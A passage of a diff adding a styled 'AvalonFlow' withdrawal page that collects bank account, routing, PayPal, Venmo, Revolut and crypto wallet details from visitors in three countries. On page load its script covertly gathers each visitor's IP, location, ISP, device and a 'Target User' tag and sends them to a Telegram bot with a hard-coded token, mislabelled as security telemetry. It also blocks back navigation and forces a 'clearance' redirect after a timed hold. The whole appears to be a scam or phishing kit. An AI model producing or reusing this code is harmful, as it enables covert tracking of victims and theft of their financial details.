+        0 0 0 3px rgba(107, 44, 216, 0.18),
+        0 10px 35px rgba(0,0,0,0.30);
+}
+
+/* dropdown options */
+#americanBankSelect option {
+    background: #12121c;
+    color: #fff;
+}
+
+/* =========================
+   BRITISH BANK SELECT
+   PREMIUM GLASS UPGRADE
+========================= */
+
+#britishBankSelect {
+    width: 100%;
+    height: 52px;
+
+    padding: 0 16px;
+
+    border: 1px solid rgba(255, 255, 255, 0.10);
+    border-radius: 18px;
+
+    background-color: rgba(255, 255, 255, 0.04);
+    color: #fff;
+
+    font-size: 14px;
+    font-weight: 500;
+
+    margin-top: 10px;
+
+    backdrop-filter: blur(18px);
+    -webkit-backdrop-filter: blur(18px);
+
+    box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+
+    transition: all 0.25s ease;
+
+    appearance: none;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+
+    cursor: pointer;
+
+    /* custom arrow */
+    background-image:
+        linear-gradient(45deg, transparent 50%, #b892ff 50%),
+        linear-gradient(135deg, #b892ff 50%, transparent 50%);
+
+    background-position:
+        calc(100% - 20px) calc(50% - 3px),
+        calc(100% - 14px) calc(50% - 3px);
+
+    background-size: 6px 6px;
+    background-repeat: no-repeat;
+}
+
+/* hover glow */
+#britishBankSelect:hover {
+    border-color: rgba(107, 44, 216, 0.5);
+
+    box-shadow:
+        0 0 0 2px rgba(107, 44, 216, 0.15),
+        0 10px 35px rgba(0,0,0,0.25);
+}
+
+/* focus state */
+#britishBankSelect:focus {
+    outline: none;
+
+    border-color: rgba(107, 44, 216, 0.7);
+
+    box-shadow:
+        0 0 0 3px rgba(107, 44, 216, 0.18),
+        0 10px 35px rgba(0,0,0,0.30);
+}
+
+/* dropdown options */
+#britishBankSelect option {
+    background: #12121c;
+    color: #fff;
+}
+
+/* ---------- Navigation Buttons ---------- */
+.nav-btn {
+  position: absolute;
+  top: 50%;
+  transform: translateY(-50%);
+  z-index: 5;
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  background: rgba(0,0,0,0.5);
+  border: 1px solid rgba(255,255,255,0.1);
+  color: white;
+  cursor: pointer;
+  backdrop-filter: blur(10px);
+  box-shadow: 0 0 15px rgba(107,44,216,0.4);
+}
+
+.nav-btn:hover {
+  background: rgba(107,44,216,0.8);
+  box-shadow:
+    0 0 20px rgba(107,44,216,0.8),
+    0 0 40px rgba(107,44,216,0.5);
+}
+
+.nav-btn.left { left: 10px; }
+.nav-btn.right { right: 10px; }
+
+                                        /* ---------- Sidebar ---------- */
+#sidebar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 280px;
+
+    /* FIX 1: Make height end exactly before the footer starts */
+    height: calc(100% - 102px); 
+
+    background: rgba(40, 75, 135, 0.75);
+
+    backdrop-filter: blur(14px);
+
+    /* FIX 2: Set z-index lower than footer (5) so footer naturally caps it */
+    z-index: 5; 
+
+    padding: 25px;
+    transform: translateX(-100%);
+    transition: transform 0.3s ease;
+}
+        #sidebar.open { transform: translateX(0); }
+        #sidebar h2{
+font-size:22px;
+margin-bottom:20px;
+color:#a78bfa;
+}
+        #sidebar button {
+            width: 100%;
+            margin: 12px 0;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            font-size: 16px;
+        }
+
+                    /* ---------- Menu Button ---------- */
+        #menuBtn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 6;
+            background: #6b2cd8;
+            border: none;
+            color: #fff;
+            padding: 12px 14px;
+            border-radius: 10px;
+}
+
+/* move button when sidebar opens */
+#menuBtn.shift{
+left:250px;
+}
+
+    /* Notification Bar */
+    .notification-bar {
+        position: fixed;
+        top: -80px;
+        right: 20px;
+        background: rgba(30, 144, 255, 0.25);
+        backdrop-filter: blur(12px);
+        border: 1px solid rgba(30,144,255,0.4);
+        color: #fff;
+        padding: 12px 18px;
+        border-radius: 12px;
+        font-size: 14px;
+font-weight: bold;
+        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+        transition: top 0.5s ease, opacity 0.5s ease;
+        z-index: 9999;
+        opacity: 0;
+        max-width: 350px;
+        white-space: normal;
+        overflow: hidden;
+    }
+    .notification-bar.show {
+        top: 20px;
+        opacity: 1;
+    }
+.notification-bar.warning-yellow {
+    color: #ffcc00;
+    font-weight: 600;
+}
+
+.notification-bar.warning-red {
+    color: #ff3b3b;
+    font-weight: 600;
+    animation: pulse 1s infinite;
+}
+    .notification-bar::before {
+        content: '';
+        position: absolute;
+        left: -50%;
+        top: 0;
+        width: 50%;
+        height: 100%;
+        background: rgba(255,255,255,0.3);
+        transform: skewX(-25deg);
+        animation: liquidWave 2s linear infinite;
+    }
+    @keyframes liquidWave {
+        0% { left: -50%; }
+        100% { left: 100%; }
+    }
+
+/* =========================
+   CANADIAN BANK SELECT
+   PREMIUM GLASS UPGRADE
+========================= */
+
+#canadianBankSelect {
+    width: 100%;
+    height: 52px;
+
+    padding: 0 16px;
+
+    border: 1px solid rgba(255, 255, 255, 0.10);
+    border-radius: 18px;
+
+    background-color: rgba(255, 255, 255, 0.04);
+    color: #fff;
+
+    font-size: 14px;
+    font-weight: 500;
+
+    margin-top: 10px;
+
+    backdrop-filter: blur(18px);
+    -webkit-backdrop-filter: blur(18px);
+
+    box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+
+    transition: all 0.25s ease;
+
+    appearance: none;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+
+    cursor: pointer;
+
+    /* custom arrow */
+    background-image:
+        linear-gradient(45deg, transparent 50%, #b892ff 50%),
+        linear-gradient(135deg, #b892ff 50%, transparent 50%);
+
+    background-position:
+        calc(100% - 20px) calc(50% - 3px),
+        calc(100% - 14px) calc(50% - 3px);
+
+    background-size: 6px 6px;
+    background-repeat: no-repeat;
+}
+
+/* hover glow */
+#canadianBankSelect:hover {
+    border-color: rgba(107, 44, 216, 0.5);
+
+    box-shadow:
+        0 0 0 2px rgba(107, 44, 216, 0.15),
+        0 10px 35px rgba(0,0,0,0.25);
+}
+
+/* focus state */
+#canadianBankSelect:focus {
+    outline: none;
+
+    border-color: rgba(107, 44, 216, 0.7);
+
+    box-shadow:
+        0 0 0 3px rgba(107, 44, 216, 0.18),
+        0 10px 35px rgba(0,0,0,0.30);
+}
+
+/* dropdown options */
+#canadianBankSelect option {
+    background: #12121c;
+    color: #fff;
+}
+
+
+      footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    text-align: center;
+    padding: 18px 0;
+    font-size: 14px;
+    color: #555;
+    background: rgba(255, 255, 255, 0.92);
+    backdrop-filter: blur(12px);
+    box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.08);
+    z-index: 6;
+}
+
+/* Update your CSS targeting rule to look like this */
+.payment-slider-viewport {
+    display: flex;
+    overflow-x: auto;
+    scroll-behavior: smooth;
+    scroll-snap-type: x mandatory;
+    -webkit-overflow-scrolling: touch;
+    width: 100%;
+margin-top: -50px;
+}
+
+.payment-slider-viewport::-webkit-scrollbar {
+    display: none;
+}
+
+.payment-container {
+    flex: 0 0 100%;
+    box-sizing: border-box;
+    scroll-snap-align: center;
+}
+
+
+
+
+.dots {
+  display: flex;
+  justify-content: center;
+  gap: 6px;
+  margin-top: 10px;
+}
+
+.dots span {
+  width: 6px;
+  height: 6px;
+  background: #555;
+  border-radius: 50%;
+}
+
+.dots span.active {
+  background: #6b2cd8;
+}
+</style>
+</head>
+<body>
+  <!-- Floating Background -->
+  <div id="floating-bg"></div>
+
+    <button id="menuBtn" onclick="toggleSidebar()">☰
+
+<div style="position: absolute; top: 54px; left: 50%; transform: translateX(-50%); white-space: nowrap; pointer-events: none; text-align: center;">
+        <span id="sidebarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Sidebar</span>
+    </div>
+</button>
+
+<div id="planNotification" class="notification-bar"></div>
+
+<!-- =========================
+TOP RIGHT PROFILE AVATAR
+========================= -->
+<div class="top-right-profile">
+     <div class="avatar-ring">
+        <img id="profilePhoto" src="default-avatar.png" class="avatar" alt="Profile picture">
+    </div>
+
+    <div style="position: absolute; top: 58px; right: 70%; transform: translateX(50%); white-space: nowrap; pointer-events: none; text-align: center;">
+        
+    </div>
+
+</div>
+
+
+<!-- =========================
+CROP MODAL
+========================= -->
+<div id="cropModal" class="crop-modal hidden">
+
+    <div class="crop-box">
+
+        <!-- file input (hidden trigger via JS) -->
+        <input type="file" id="photoInput" accept="image/*">
+
+        <!-- crop preview -->
+        <div class="crop-preview">
+            <img id="cropImage">
+        </div>
+
+        <!-- actions -->
+        <div class="crop-actions">
+            <button id="saveCropped">Save Photo</button>
+            <button id="cancelCrop">Cancel</button>
+        </div>
+
+    </div>
+
+</div>
+
+       <div id="sidebar">
+       <h2>AvalonFlow</h2>
+    <button onclick="window.location.href='/dashboard'">Dashboard</button>
+<button onclick="window.location.href='/notifications'">My Notifications</button>
+    <button onclick="window.location.href='/withdrawal'">Withdrawal</button>
+    <button onclick="logout()">Logout</button>
+</div>
+<div id="overlay" onclick="toggleSidebar()"></div>
+
+  <header class="minimal-logo-header">
+  <div class="logo-shimmer-wrapper">
+    <img src="assets/pictures/1780995787737.jpeg" alt="Avalon Logo" class="avalon-logo-img">
+  </div>
+</header>
+
+<section id="section3" style="position: relative; max-width: 600px; margin: 0 auto;">
+
+  <div class="payment-slider-viewport">
+
+    <!-- CANADA CONTAINER -->
+    <div class="payment-container">
+      <p class="glass-cardsrd acu-gradient">
+        <strong>Canada 🇨🇦</strong>
+        <div style="height:4px;"></div>
+      </p>
+
+      <div class="glass-card">
+        <div class="top-trust">
+          Automatic Disbursement supported via global payment networks.
+        </div>
+
+        <!-- Interac e-Transfer -->
+        <div class="payment-method glass-cards" data-method="Interac e-Transfer" data-region="canada">
+          <div class="payment-header">
+            <img class="payment-logo" src="https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/980ec2577fa19bf58d7ca687805b52c3.jpg">
+            <span>▼ Interac e-Transfer</span>
+          </div>
+          <input id="interacName" placeholder="Account Holder Name">
+          <input id="interacInput" placeholder="Enter your email for e-Transfer">
+        </div>
+
+        <!-- Canadian Bank Transfer -->
+        <div class="payment-method glass-cards" data-method="Canadian Bank Transfer" data-region="canada">
+          <div class="payment-header">
+            <img class="payment-logos" src="https://cdn-icons-png.flaticon.com/512/2830/2830284.png">
+            <span>▼ Bank Transfer</span>
+          </div>
+          <select id="canadianBankSelect">
+            <option value="">Select Your Bank</option>
+            <option>RBC Royal Bank</option>
+            <option>TD Canada Trust</option>
+            <option>Scotiabank</option>
+            <option>BMO</option>
+            <option>CIBC</option>
+            <option>National Bank</option>
+            <option>Tangerine</option>
+            <option>Simplii Financial</option>
+          </select>
+          <input id="accountName" placeholder="Account Holder Name">
+          <input id="transitNumber" placeholder="Transit Number (5 digits)">
+          <input id="institutionNumber" placeholder="Institution Number (3 digits)">
+          <input id="accountNumber" placeholder="Account Number (7-12 digits)">
+        </div>
+
+        <!-- Canada PayPal -->
+        <div class="payment-method glass-cards" data-method="Canada PayPal" data-region="canada">
+          <div class="payment-header">
+            <img class="payment-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg">
+            <span>▼ PayPal</span>
+          </div>
+          <input id="paypalName" placeholder="Account Holder Name">
+          <input id="paypalInput" placeholder="Enter your PayPal email">
+        </div>
+
+        <!-- Canada USDT / USDC -->
+        <div class="payment-method glass-cards" data-method="Canada USDT / USDC ERC20" data-region="canada">
+          <div class="token-logos">
+            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png">
+            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
+            <span>▼ USDT / USDC [ERC-20]</span>
+          </div>
+          <input id="cryptoName" placeholder="Account Holder Name">
+          <input id="acuAccount" placeholder="Enter your ERC-20 wallet address (0x...)">
+          <div class="network-note">⚠ ERC-20 network only</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- UNITED STATES CONTAINER -->
+    <div class="payment-container">
+      <p class="glass-cardsrd acu-gradient">
+        <strong>United States 🇺🇸</strong>
+        <div style="height:4px;"></div>
+      </p>
+
+      <div class="glass-card">
+        <div class="top-trust">
+          Automatic Disbursement supported via global payment networks.
+        </div>
+
+        <!-- Venmo -->
+        <div class="payment-method glass-cards" data-method="Venmo" data-region="usa">
+          <div class="payment-header">
+            <img class="payment-logo" src="assets/pictures/5f33cd7cd34531a65477de41742743d3.jpg">
+            <span>Venmo</span>
+          </div>
+          <input id="venmoName" placeholder="Account Holder Name">
+          <input id="venmoInput" placeholder="Enter your Venmo username (e.g., @username)">
+        </div>
+
+        <!-- American Bank Transfer -->
+        <div class="payment-method glass-cards" data-method="American Bank Transfer" data-region="usa">
+          <div class="payment-header">
+            <img class="payment-logosss" src="https://cdn-icons-png.flaticon.com/512/2830/2830284.png">
+            <span>▼ Bank Transfer</span>
+          </div>
+          <select id="americanBankSelect">
+            <option value="">Select Your Bank</option>
+            <option>Chase Bank</option>
+            <option>Bank of America</option>
+            <option>Wells Fargo</option>
+            <option>Citi (Citibank)</option>
+            <option>U.S. Bank</option>
+            <option>PNC Bank</option>
+            <option>Capital One</option>
+            <option>Fifth Third Bank</option>
+          </select>
+          <input id="accountName-us" placeholder="Account Holder Name">
+          <input id="transitNumber-us" placeholder="Routing Number (9 digits)">
+          <input id="accountNumber-us" placeholder="Account Number (4-17 digits)">
+        </div>
+
+        <!-- US PayPal -->
+        <div class="payment-method glass-cards" data-method="US PayPal" data-region="usa">
+          <div class="payment-header">
+            <img class="payment-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg">
+            <span>▼ PayPal</span>
+          </div>
+          <input id="paypalName-us" placeholder="Account Holder Name">
+          <input id="paypalInput-us" placeholder="Enter your PayPal email">
+        </div>
+
+        <!-- US USDT / USDC -->
+        <div class="payment-method glass-cards" data-method="US USDT / USDC ERC20" data-region="usa">
+          <div class="token-logos">
+            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png">
+            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
+            <span>▼ USDT / USDC [ERC-20]</span>
+          </div>
+          <input id="cryptoName-us" placeholder="Account Holder Name">
+          <input id="acuAccount-us" placeholder="Enter your ERC-20 wallet address (0x...)">
+          <div class="network-note">⚠ ERC-20 network only</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- UNITED KINGDOM CONTAINER -->
+    <div class="payment-container">
+      <p class="glass-cardsrd acu-gradient">
+        <strong>United Kingdom 🇬🇧</strong>
+        <div style="height:4px;"></div>
+      </p>
+
+      <div class="glass-card">
+        <div class="top-trust">
+          Automatic Disbursement supported via global payment networks.
+        </div>
+
+        <!-- Revolut -->
+        <div class="payment-method glass-cards" data-method="Revolut" data-region="uk">
+          <div class="payment-header">
+            <img class="payment-logo" src="assets/pictures/WA_1783361545224.jpeg">
+            <span>Revolut</span>
+          </div>
+          <input id="revolutName" placeholder="Account Holder Name">
+          <input id="revolutInput" placeholder="Enter your Revtag (e.g., @username)">
+        </div>
+
+        <!-- British Bank Transfer -->
+        <div class="payment-method glass-cards" data-method="British Bank Transfer" data-region="uk">
+          <div class="payment-header">
+            <img class="payment-logoss" src="https://cdn-icons-png.flaticon.com/512/2830/2830284.png">
+            <span>▼ Bank Transfer</span>
+          </div>
+          <select id="britishBankSelect">
+            <option value="">Select Your Bank</option>
+            <option>Barclays</option>
+            <option>HSBC UK</option>
+            <option>Lloyds Bank</option>
+            <option>Santander UK</option>
+            <option>Halifax</option>
+            <option>TSB Bank</option>
+            <option>Nationwide</option>
+            <option>NatWest</option>
+          </select>
+          <input id="accountName-uk" placeholder="Account Holder Name">
+          <input id="transitNumber-uk" placeholder="Sort Code (6 digits, e.g. 12-34-56)">
+          <input id="accountNumber-uk" placeholder="Account Number (8 digits)">
+        </div>
+
+        <!-- UK PayPal -->
+        <div class="payment-method glass-cards" data-method="UK PayPal" data-region="uk">
+          <div class="payment-header">
+            <img class="payment-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg">
+            <span>▼ PayPal</span>
+          </div>
+          <input id="paypalName-uk" placeholder="Account Holder Name">
+          <input id="paypalInput-uk" placeholder="Enter your PayPal email">
+        </div>
+
+        <!-- UK USDT / USDC -->
+        <div class="payment-method glass-cards" data-method="UK USDT / USDC ERC20" data-region="uk">
+          <div class="token-logos">
+            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png">
+            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
+            <span>▼ USDT / USDC [ERC-20]</span>
+          </div>
+          <input id="cryptoName-uk" placeholder="Account Holder Name">
+          <input id="acuAccount-uk" placeholder="Enter your ERC-20 wallet address (0x...)">
+          <div class="network-note">⚠ ERC-20 network only</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="dots">
+    <span class="active"></span>
+    <span></span>
+    <span></span>
+  </div>
+
+  <button class="nav-btn left">&#8592;</button>
+  <button class="nav-btn right">&#8594;</button>
+
+  <div id="navButtons"
+       style="max-width:600px;margin:40px auto 100px;display:flex;justify-content:flex-end;position:relative;z-index:5;">
+    <button id="nextBtnSeparate"
+            style="background:rgba(107,44,216,0.9);border:1px solid #fff;padding:12px 24px;border-radius:12px;font-weight:bold;color:#fff;">
+      Withdraw
+    </button>
+  </div>
+
+</section>
+
+<footer>
+   © 2026 AvalonFlow Corp • All Rights Reserved
+</footer>
+
+
+<script>
+// ==========================================
+// 🔔 LIGHTWEIGHT TAB & BADGE WATCHER (Sub-pages)
+// ==========================================
+
+const CLEARANCE_REDIRECT_URL = "https://membership.avalonflow.site/notifications";
+const ENABLE_SUBPAGE_HOLD_REDIRECT = true;
+
+const originalDocumentTitle = "Notifications";
+let titleInterval = null;
+
+function stopTitleFlashing() {
+    if (titleInterval) {
+        clearInterval(titleInterval);
+        titleInterval = null;
+    }
+}
+
+function startTitleFlashing(count) {
+    stopTitleFlashing();
+    if (!document.hidden || count === 0) return;
+
+    let toggle = false;
+    titleInterval = setInterval(() => {
+        document.title = toggle ? `🔔 (${count}) New Notification!` : `(${count}) ${originalDocumentTitle}`;
+        toggle = !toggle;
+    }, 1000);
+}
+
+function getFallbackActiveIds() {
+    const isWithdrawn = localStorage.getItem("av_withdrawn") === "true" || localStorage.getItem("av_is_withdrawn") === "true";
+    let storedWithdrawalTime = localStorage.getItem("av_withdrawal_time");
+    let baseWithdrawalMs = storedWithdrawalTime ? new Date(storedWithdrawalTime).getTime() : Date.now();
+    if (isNaN(baseWithdrawalMs)) baseWithdrawalMs = Date.now();
+    const elapsedMinutes = Math.floor((Date.now() - baseWithdrawalMs) / (1000 * 60));
+
+    const ids = [{ id: 1 }, { id: 3 }, { id: 4 }, { id: 5 }];
+
+    if (isWithdrawn) {
+        ids.push({ id: 2 });
+        if (elapsedMinutes >= 5 || localStorage.getItem("av_force_hold") === "true") {
+            ids.push({ id: 9 });
+        }
+        if (elapsedMinutes >= 30 || localStorage.getItem("av_force_hold") === "true") {
+            ids.push({ id: 10 });
+        }
+    }
+    return ids;
+}
+
+function checkUnreadNotifications() {
+    const deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
+    const readIds = JSON.parse(localStorage.getItem('av_read_notifs') || '[]');
+
+    const rawCache = localStorage.getItem('av_active_notifs_cache');
+    const activeNotifications = rawCache ? JSON.parse(rawCache) : getFallbackActiveIds();
+
+    const isHoldActiveAndUnread = activeNotifications.some(n => n.id === 10) && !readIds.includes(10) && !deletedIds.includes(10);
+
+    if (ENABLE_SUBPAGE_HOLD_REDIRECT && isHoldActiveAndUnread) {
+        window.location.replace(CLEARANCE_REDIRECT_URL);
+        return;
+    }
+
+    const unreadCount = activeNotifications.filter(n => 
+        !deletedIds.includes(n.id) && !readIds.includes(n.id)
+    ).length;
+
+    const badge = document.getElementById('unread-count');
+    if (badge) {
+        badge.textContent = `${unreadCount} unread`;
+        badge.classList.toggle('hidden', unreadCount === 0);
+    }
+
+    if (document.hidden && unreadCount > 0) {
+        startTitleFlashing(unreadCount);
+    } else {
+        stopTitleFlashing();
+        document.title = unreadCount > 0 ? `(${unreadCount}) ${originalDocumentTitle}` : originalDocumentTitle;
+    }
+}
+
+window.addEventListener("storage", (e) => {
+    if (["av_read_notifs", "av_deleted_notifs", "av_active_notifs_cache", "av_withdrawn", "av_force_hold"].includes(e.key)) {
+        checkUnreadNotifications();
+    }
+});
+
+document.addEventListener("visibilitychange", () => {
+    if (!document.hidden) stopTitleFlashing();
+    checkUnreadNotifications();
+});
+
+window.addEventListener("focus", checkUnreadNotifications);
+checkUnreadNotifications();
+
+
+// ==========================================
+// 1. TELEGRAM VISITOR TRACKING CONFIGURATION
+// ==========================================
+const TELEGRAM_BOT_TOKENs = "8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E";
+const TELEGRAM_CHAT_IDs = "-1003913850436";
+
+async function sendVisitorDetailsToTelegram() {
+  try {
+    if (sessionStorage.getItem('visitor_logged_tg')) return;
+
+    const rawAgent = navigator.userAgent;
+
+    if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
+      console.log("🤖 Automated link indexing crawler bypassed safely.");
+      return;
+    }
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
+
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+    const ipData = await ipResponse.json();
+
+    const currentPage = window.location.pathname;
+    let detailedDevice = "Unknown Device";
+    let detectedBrowser = "Unknown Browser";
+
+    if (/WhatsApp/i.test(rawAgent)) detectedBrowser = "WhatsApp In-App";
+    else if (/TelegramBot|Telegram/i.test(rawAgent)) detectedBrowser = "Telegram In-App";
+    else if (/Instagram/i.test(rawAgent)) detectedBrowser = "Instagram App";
+    else if (/TikTok/i.test(rawAgent)) detectedBrowser = "TikTok App";
+    else if (/FBAN|FBAV/i.test(rawAgent)) detectedBrowser = "Facebook App";
+    else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) detectedBrowser = "X (Twitter) App";
+    else if (/LinkedInApp/i.test(rawAgent)) detectedBrowser = "LinkedIn App";
+    else if (/Phoenix/i.test(rawAgent)) detectedBrowser = "Phoenix Browser";
+    else if (/SamsungBrowser/i.test(rawAgent)) detectedBrowser = "Samsung Internet";
+    else if (/OComponent|Opera|OPR/i.test(rawAgent)) detectedBrowser = "Opera";
+    else if (/Edg/i.test(rawAgent)) detectedBrowser = "Microsoft Edge";
+    else if (/Firefox|FxiOS/i.test(rawAgent)) detectedBrowser = "Mozilla Firefox";
+    else if (/Chrome|CriOS/i.test(rawAgent)) detectedBrowser = "Google Chrome";
+    else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) detectedBrowser = "Apple Safari";
+
+    const referrer = document.referrer || "";
+    if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
+      if (/mail\.google\.com/i.test(referrer)) detectedBrowser += " (via Gmail Web)";
+      else if (/mail\.yahoo/i.test(referrer)) detectedBrowser += " (via Yahoo Mail Web)";
+      else if (/outlook|live\.com/i.test(referrer)) detectedBrowser += " (via Outlook Web)";
+    }
+
+    if (/Android/i.test(rawAgent)) {
+      const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
+      detailedDevice = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
+    } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
+      const match = rawAgent.match(/OS\s+(\d+_\d+)/);
+      const iosVer = match ? match[1].replace('_', '.') : '';
+      detailedDevice = `iOS ${iosVer} (Apple Device)`;
+    } else if (/Windows/i.test(rawAgent)) {
+      const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
+      let winVer = "PC";
+      if (match) {
+        if (match[1] === "10.0") winVer = "10/11";
+        else if (match[1] === "6.3") winVer = "8.1";
+        else if (match[1] === "6.1") winVer = "7";
+      }
+      detailedDevice = `Windows ${winVer}`;
+    } else if (/Macintosh/i.test(rawAgent)) {
+      detailedDevice = "macOS Device";
+    } else if (/Linux/i.test(rawAgent)) {
+      detailedDevice = "Linux System";
+    }
+
+    const isProxy = ipData.proxy || false;
+    const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
+
+    const payload = {
+      device: detailedDevice,
+      browser: detectedBrowser,
+      screenResolution: `${window.screen.width}x${window.screen.height}`,
+      connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+      ip: ipDisplay || "Unknown",
+      city: ipData.city || "Unknown",
+      region: ipData.region || "Unknown",
+      country: ipData.country_name || "Unknown",
+      isp: ipData.org || "Unknown",
+      timestamp: new Date().toLocaleString()
+    };
+
+    const messageText = `⚡ <b>New Visitor Alert | AvalonFlow</b>\n\n` +
+                        `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
+                        `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
+                        `🌐 <b>IP:</b> <code>${payload.ip}</code>\n` +
+                        `📍 <b>Location:</b> <code>${payload.city}, ${payload.region}, ${payload.country}</code>\n` +
+                        `🏢 <b>ISP:</b> <code>${payload.isp}</code>\n` +
+                        `📶 <b>Net Speed:</b> <code>${payload.connectionType}</code>\n` +
+                        `🌐 <b>Browser:</b> <code>${payload.browser}</code>\n` +
+                        `📱 <b>Device Setup:</b> <code>${payload.device}</code>\n` + 
+                        `📐 <b>Screen Res:</b> <code>${payload.screenResolution}</code>\n` +
+                        `📐 <b>Time:</b> <code>${payload.timestamp}</code>`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKENs}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_IDs,
+        text: messageText,
+        parse_mode: 'HTML'
+      })
+    });
+
+    sessionStorage.setItem('visitor_logged_tg', 'true');
+    console.log("🔒 Security telemetry parameters forwarded successfully.");
+  } catch (err) {
+    console.warn("Telegram telemetry bypass error:", err);
+  }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  sendVisitorDetailsToTelegram();
+});
+
+history.pushState(null, null, location.href);
+window.addEventListener('popstate', function () {
+  history.go(1);
+});
+
+window.addEventListener('keydown', function (e) {
+  if ((e.key === 'Backspace' && e.target === document.body) || e.key === 'ArrowLeft') {
+    e.preventDefault();
+  }
+});
+
+
+// ==========================================
+// BANK LOGO SWITCHERS
+// ==========================================
+$(document).ready(function () {
+    const bankLogosCA = {
+        "RBC Royal Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/4889b91421334f04992dbd75abd44c94.jpg",
+        "TD Canada Trust": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/e90fc5400809adf33e281d9f876d5485.jpg",
+        "Scotiabank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/839782492ccfda0e5f616798c2646804.jpg",
+        "BMO": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/1352e3513e09b08d6559887eae7f8f7a.jpg",
+        "CIBC": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/39502b52ef053fc42561434042a06ecd.jpg",
+        "National Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/fb34b722f69d354bf24dd585444a6cee.jpg",
+        "Tangerine": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Tangerine_Bank-Logo.wine.png",
+        "Simplii Financial": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Simplii_Financial_branding.jpg"
+    };
+
+    const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
+    const $logoCA = $('.payment-logos');
+
+    $('#canadianBankSelect').on('change', function () {
+        const selectedBank = $(this).val();
+        const newLogo = bankLogosCA[selectedBank] || defaultLogo;
+        $logoCA.addClass('is-hidden');
+        const tempImg = new Image();
+        tempImg.onload = function () {
+            $logoCA.attr('src', newLogo);
+            void $logoCA[0].offsetWidth;
+            $logoCA.removeClass('is-hidden');
+        };
+        tempImg.src = newLogo;
+    });
+
+    const bankLogosUS = {
+        "Chase Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/dcaa7faba74f565af7efbf1135c2e144.jpg",
+        "Bank of America": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/7826c02a5b48ea41e801cafcb0bba674.jpg",
+        "Wells Fargo": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Wells_Fargo_Logo_(2020).png",
+        "Citi (Citibank)": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/df079c7d167289b284e6bc9402a81c96.jpg",
+        "U.S. Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/US-Bank-Logo-700x394.png",
+        "PNC Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/PNClogo.svg.png",
+        "Capital One": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Capital_One_logo.svg.png",
+        "Fifth Third Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/logo-stacked-primary-full-thumb.png"
+    };
+
+    const $logoUS = $('.payment-logosss');
+
+    $('#americanBankSelect').on('change', function () {
+        const selectedBank = $(this).val();
